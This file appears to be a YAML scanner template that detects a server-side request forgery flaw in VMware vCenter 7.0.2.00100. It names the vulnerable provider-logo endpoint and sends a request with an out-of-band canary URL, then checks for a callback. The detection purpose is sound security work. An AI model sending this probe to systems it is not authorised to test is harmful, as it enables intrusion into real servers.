id: "vmware-vcenter-ssrf"
name: "VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting"
severity: "critical"
description: "VMware vCenter 7.0.2.00100 is susceptible to multiple vulnerabilities including server-side request forgery, local file inclusion, and cross-site scripting."
tech:
  - "generic"
tags:
  - "ssrf"
  - "lfi"
  - "xss"
  - "oast"
  - "vcenter"
  - "vmware"
  - "vuln"
cwe: "CWE-918"
reference: "https://github.com/l0ggg/VMware_vCenter"
spaExclusion: true
request:
  method: "GET"
  path: "/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url={{guardian_canary_http}}"
control:
  method: "GET"
  path: "/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "canary"
    protocol: "http"
